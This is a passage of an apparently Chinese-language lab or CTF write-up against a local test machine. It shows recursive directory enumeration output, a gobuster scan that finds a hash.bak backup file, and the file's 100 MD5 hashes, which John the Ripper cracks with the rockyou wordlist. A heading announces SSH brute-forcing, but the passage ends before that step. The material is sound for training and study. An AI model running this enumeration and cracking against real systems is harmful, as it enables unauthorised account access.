+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;                                                      
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;                                                    
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;                                                  
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;                                                
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;                                              
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;                                            
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;                                          
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;                                        
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;                                      
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;                                    
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F; ----
+&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;s&#x2F;                                  
+                                                                                                                                           
+---- Entering directory: http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;s&#x2F; ----
++ http:&#x2F;&#x2F;192.168.209.23&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;s&#x2F;index.html (CODE:200|SIZE:1531)                
+                                                                               p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;s&#x2F;zt                                  
+-----------------
+END_TIME: Tue Sep  2 20:46:35 2025
+DOWNLOADED: 161420 - FOUND: 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>给出了一个路径<a target="_blank" rel="noopener" href="http://192.168.209.23/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/index.html">http://192.168.209.23/s/u/p/e/r/c/a/l/i/f/r/a/g/i/l/i/s/t/i/c/e/x/p/i/a/l/i/d/o/c/i/o/u/s/index.html</a></p>
+<p><img src="/posts/e94215f1/image-20250903100520498.png" alt="image-20250903100520498"></p>
+<p>源码内有一个这个注释内容</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!-- check for backup files --&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>那么在这个路径下找一下bak文件</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# gobuster dir -u http:&#x2F;&#x2F;192.168.209.213&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;s&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x html,php,txt,bak
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+[+] Url:                     http:&#x2F;&#x2F;192.168.209.213&#x2F;s&#x2F;u&#x2F;p&#x2F;e&#x2F;r&#x2F;c&#x2F;a&#x2F;l&#x2F;i&#x2F;f&#x2F;r&#x2F;a&#x2F;g&#x2F;i&#x2F;l&#x2F;i&#x2F;s&#x2F;t&#x2F;i&#x2F;c&#x2F;e&#x2F;x&#x2F;p&#x2F;i&#x2F;a&#x2F;l&#x2F;i&#x2F;d&#x2F;o&#x2F;c&#x2F;i&#x2F;o&#x2F;u&#x2F;s&#x2F;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster&#x2F;3.6
+[+] Extensions:              html,php,txt,bak
+[+] Timeout:                 10s
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+Starting gobuster in directory enumeration mode
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+&#x2F;index.html           (Status: 200) [Size: 1531]
+&#x2F;.php                 (Status: 403) [Size: 280]
+&#x2F;.html                (Status: 403) [Size: 280]
+&#x2F;hash.bak             (Status: 200) [Size: 3300]
+Progress: 53785 &#x2F; 1102805 (4.88%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 54364 &#x2F; 1102805 (4.93%)
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+Finished
+&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="爆破ssh登陆用户"><a href="#爆破ssh登陆用户" class="headerlink" title="爆破ssh登陆用户"></a>爆破ssh登陆用户</h2><p>有一个hash.bakw文件</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# cat hash.bak     
+fcb6cc0d2a780ac022cf70ceb0d85f4c
+c63c3575b62f4944fba4879c2dd3951b
+638ce7e5ddd59ec236bc464f2fdb9958
+de39f38ac0601775fe2976f707820860
+3eb4df395ce955935f7df935cc314833
+f5c3701f78d9de915674eb111107d1ce
+5de115c35eccd5efdaa18247c312c519
+1ebcead2dd18dd4518dda4d7f21ca75b
+2564d92163ec30fefa9ffe64a406c1eb
+5e11a4dda78311c92513be3ec811de2d
+07a693a043fe57e8882a10d715e34def
+386c974027266cb5e4fb7a76b98f72a9
+b920fe56b8edcd7079c4646c0b17fd70
+cd2bec41fca2fd556b7337b0e5306a92
+164087a4f9e3bad35b42ab0fc3cb4a8b
+b0a64abc8f76fda3de6e64f257ac03d1
+978700c3577e262664c893b6923dbe84
+0ef2d910c4c95afe805944ded83fdd01
+9f4a37dd9473d1499b0183fe27fad161
+e02291c1665bef79ef5d03999e096e99
+9001f399914455b4d28262e3bfbf4837
+15bca15fd894a2f8ea93a4fa908004a9
+145577410c5c4c921b7179cf050b2de3
+7b1d073327a2e36f008c2a33bfb410f6
+29fef2456471ee9ebb93f064287fdbe0
+f17f9338942f8648e77256ec49d62f99
+09c4c8b77e9d094f6904dbb4ecfd5e29
+f9ce5255f5b87d6b92dd3dfaca53ff0d
+253400cf25fb8074c53e7bdd875e11f3
+6fcf10b31abdf124aa30f35d7fe0e439
+224f5b653c4aded1188fb492d32aef86
+996f5dc87b3bc8fadf89283f3856e968
+00929a695ab177caac17265b266a248c
+dd2064a2d30fe9819e44e625bbd6846a
+d935d8c8edbcb29be9a7044d24f2ad98
+344b00b3c4b66d15e182b0555ed84fc5
+b5f2a7288535076656defc2a6de1f465
+94024af39da8052f93f0ef145f651ffb
+1d33712e7017cac4dd36db6a93e7c5cd
+85bc82eb20a04c4f359ca3d6eae76840
+d41dea8e8e80fb0235a6c6a18724b1bf
+feb4df4aa10ba7e0d57ba1398260cc4f
+1e8a05586a7208f79fbb7eed34b6419c
+821c1470e03a866bc1a8d775b35dc1ba
+bef283d25e5513a191f68d49cfd063ad
+6d2c24058297080518149433c5ed24d4
+02e54fe99adde6dc4c980a91d781adeb
+52d868b74d7b265e5eb2ca20e21ea8f0
+5cb986443092f58d0f923d84ba75d14a
+b822fb7c7174a7ddbc3e61f4b3701c06
+50d15d960f7a3b92711006da4d0c7e5c
+4b2ad4cac45424a0e55b9f8414b3fa11
+e024fad87c17dfa1b0af168a1a8fdff3
+2650a11ede243dd52b322373d98994e1
+468160d24d6eaa81da06c8aaf4df672c
+e92eb8d05caa1d090889c698be9b498b
+4a3f1be43b7013ac31d0b47094818f0d
+f25ca2fc0b4042a9b51dbb5af7638f18
+b14621954f0ec5aa797af4d85bce8117
+65811bc116cba21876322d3d70f8f0c9
+6c24314f5f8b80b2593ff9608cc31f30
+c0de30e0101c677a48ba481cc73cdab2
+eb97a4755f70b263b4aab7057fe5b2a3
+89e77196981ecb56e2157cece2209d9c
+941bda079a7c6a8e9de2e1d5918f409d
+428f1cc60527a496932e0eb5389c4e57
+b3cb3a63b73c48b2c0bb32dc8567f5fd
+de3bb01bf3cd06160036602002679413
+9f82bf4c813d313b83913469b3dfb5ba
+8b84dfd3c60e007597666b89168f7f0b
+40288e57bf9c16328875d64859874073
+6d1272381ce3701a11cd8b1392293b86
+7532279d12d2d69a33bcf4789994b356
+9e9d3b6b4aaba248d7c51ff4148c8d0f
+ded52ab9e5c0429653f9170a07a13306
+ee0d92f36b659fdef60b0ad87ad2dc1f
+66b14cc4f5208e7b81a30a28e6b3d316
+31aa17817e731ab263f2ad17578747f0
+932232b0be295dd13822ce50b2846e55
+41f735f9156444d106b195541f27506f
+8ff248dffdf032467aad2c183f37cbb9
+0752761b670db5a776c4079959e1cefa
+36038680b0a4dd318339c7d6f14e27d7
+9128262fabd151136a4f5173c9f8b687
+a16529ed27831262cbfb879bdb372813
+c3c016a1ded2e9139566365156ac0e10
+2118c709cb65868d19cc0eb70a1fd603
+1a4d5a0bd8e7ae4c52b75116e261ff53
+2ce6a8451b97c9fbf126feaabc020cfe
+df5f5384aad29a7fd6530a00007c2321
+18e117c28e23c72258ed6b586c64d79a
+18d22557b4b6295d67454c785fef3077
+55d6ee3de3b444089c781750b482fe21
+918510f4ff412b295f36faefa201faf3
+25eb45a8ef6afe982e620e99d4250a8c
+0110cf151f8f33cb9dd20bdae55c6466
+57456e2f168afe1f74e62338488f9498
+f926d9e7fb308761b2325b5984eb2b1e
+0423e0611b22442c331eb0e269e524a7
+6951ad981f72d142966b8f7ee1c3e691<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>是一大堆的md5字符串。解密一下</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;aaa]
+└─# john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hash.bak --format&#x3D;Raw-MD5
+Using default input encoding: UTF-8
+Loaded 100 password hashes with no different salts (Raw-MD5 [MD5 256&#x2F;256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork&#x3D;4
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+kent12           (?)     
+amotejoel        (?)     
+sunjoo           (?)     
+iydgmvin         (?)     
+elised           (?)     
+530223           (?)     
+viking35         (?)     
+naughtycat       (?)     
+shadow626        (?)     
+middelweg        (?)     
+eloscar          (?)     
+cash1407         (?)     
+carlosmoya       (?)     
+xytyx1972        (?)     
+vanity17         (?)     
+v0nowns.         (?)     
+teadorohector    (?)     
+taroh527         (?)     
+susancliford     (?)     
+suicida*02       (?)     
+snoopymai12277++ (?)     
+simpsonss        (?)     
+short487         (?)     
+sheelyka         (?)     
+sexiestmonkey    (?)     
+sanchezgenao     (?)     
+s9136286d        (?)     
+roldann          (?)     
+rocktolife       (?)     
+rebe11s          (?)     
+o823o2           (?)     
+nika1212         (?)     
+nealmc           (?)     
+mymiddlename     (?)     
+mouses01         (?)     
+mosuga1          (?)     
+madeson4me       (?)     
+lufkin3          (?)     
+luckybear13      (?)     
+loveyai054359503 (?)     
+little_m         (?)     
+lindilu          (?)     
+lcisme69         (?)     
+kmkm76           (?)     
+kiezcute         (?)     
+keyki            (?)     
+kaleli1975       (?)     
+justine145       (?)     
+jojoisamuffin1   (?)     
+jmac92777        (?)     
+jennycane6       (?)     
+ilovenickjerryjonas (?)     
+igorlain         (?)     
+hold40           (?)     
+gnyja4           (?)     
+gina5432         (?)     
+foffbastards     (?)     
+federal5         (?)     
+eryt6587oi       (?)     
+elogue           (?)     
+ddm1203          (?)     
+dazha            (?)     
+dah3ss           (?)     
+copperkiwi324    (?)     
+cocian           (?)     
+cesurcesur       (?)     
+cannonballs      (?)     
+boggsjr          (?)     
+ben and leo      (?)     
+baby0sita        (?)     
+amp#88           (?)     
+adiksapink       (?)     
+actionlive       (?)     
+Sammon           (?)     
+McCain           (?)     
+MENZOBERRANZAN   (?)     
+MARIEC210        (?)     
+Karis123456      (?)     
+Dan2109&lt;3        (?)     
+Cusita74         (?)     
+ARES29           (?)     
+978645312N       (?)     
+8153154          (?)     
+7297163          (?)     
+56371105         (?)     
+5636378paulo     (?)     
+33570654         (?)     
+30procklisroad   (?)     
+224466882468     (?)     
+2173512          (?)     
+21094572         (?)     
+14212862         (?)     
+113fox.13        (?)     
+09202515339      (?)     
+0869169575       (?)     
+0866500130       (?)     
+0865508166       (?)     
+0848499262       (?)     
+0831428854       (?)     
+0800385914       (?)     
+100g 0:00:00:01 DONE (2025-09-02 21:22) 84.74g&#x2F;s 11764Kp&#x2F;s 11764Kc&#x2F;s 620074KC&#x2F;s 0800436836..0800349428
+Use the &quot;--show --format&#x3D;Raw-MD5&quot; options to display all of the cracked passwords reliably
